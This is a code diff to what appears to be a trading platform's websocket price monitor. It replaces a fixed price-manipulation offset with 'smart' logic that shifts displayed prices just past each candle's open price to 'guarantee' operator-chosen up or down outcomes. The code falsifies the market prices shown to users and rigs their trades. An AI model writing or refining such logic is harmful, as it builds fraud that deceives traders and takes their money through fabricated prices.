@@ -139,9 +139,6 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 overrides = indexModule.candleOverride || {};
             } catch (e) {}
 
-            const MANIPULATION_PERCENTAGE = 0.0018; 
-            const SMOOTHING_TIME_MS = 12000; 
-
             // 🚀 1. LIVE TICKER DATA (24H Percentage)
             if (parsed.e === '24hrTicker') {
                 const pair = parsed.s;
@@ -154,21 +151,44 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 let realPrice = parseFloat(parsed.p);
                 const binanceTime = parsed.E; 
 
+                // 🚀 MAGIC FIX: Smart Dynamic Target Logic
                 let targetOffset = 0;
-                if (overrides[pair] === 'up') targetOffset = realPrice * MANIPULATION_PERCENTAGE;
-                else if (overrides[pair] === 'down') targetOffset = -(realPrice * MANIPULATION_PERCENTAGE);
+                const currentCandle = globalMarketData[pair]?.currentCandle;
+
+                if (overrides[pair] && currentCandle) {
+                    const openPrice = currentCandle.open;
+                    const SAFE_MARGIN = openPrice * 0.00015; // 0.015% safe margin to guarantee win
+
+                    if (overrides[pair] === 'up') {
+                        const safeTargetPrice = openPrice + SAFE_MARGIN;
+                        if (realPrice < safeTargetPrice) {
+                            targetOffset = safeTargetPrice - realPrice;
+                        } else {
+                            targetOffset = 0; // Market pehle hi ooper hai, rocket mat banao
+                        }
+                    } else if (overrides[pair] === 'down') {
+                        const safeTargetPrice = openPrice - SAFE_MARGIN;
+                        if (realPrice > safeTargetPrice) {
+                            targetOffset = safeTargetPrice - realPrice;
+                        } else {
+                            targetOffset = 0; // Market pehle hi neechay hai
+                        }
+                    }
+                }
 
                 if (currentOffsets[pair] === undefined) currentOffsets[pair] = 0;
 
                 const timeDiff = binanceTime - (lastAggTimes[pair] || binanceTime);
                 lastAggTimes[pair] = binanceTime;
 
-                const speedPerMs = (realPrice * MANIPULATION_PERCENTAGE) / SMOOTHING_TIME_MS;
+                // Smooth Volatility Engine (Zalzala Lift)
+                const SMOOTHING_TIME_MS = 10000; 
+                const maxSpeedPerMs = (realPrice * 0.001) / SMOOTHING_TIME_MS;
 
                 if (currentOffsets[pair] < targetOffset) {
-                    currentOffsets[pair] = Math.min(currentOffsets[pair] + (speedPerMs * timeDiff), targetOffset);
+                    currentOffsets[pair] = Math.min(currentOffsets[pair] + (maxSpeedPerMs * timeDiff), targetOffset);
                 } else if (currentOffsets[pair] > targetOffset) {
-                    currentOffsets[pair] = Math.max(currentOffsets[pair] - (speedPerMs * timeDiff), targetOffset);
+                    currentOffsets[pair] = Math.max(currentOffsets[pair] - (maxSpeedPerMs * timeDiff), targetOffset);
                 }
 
                 let currentPrice = realPrice + currentOffsets[pair];
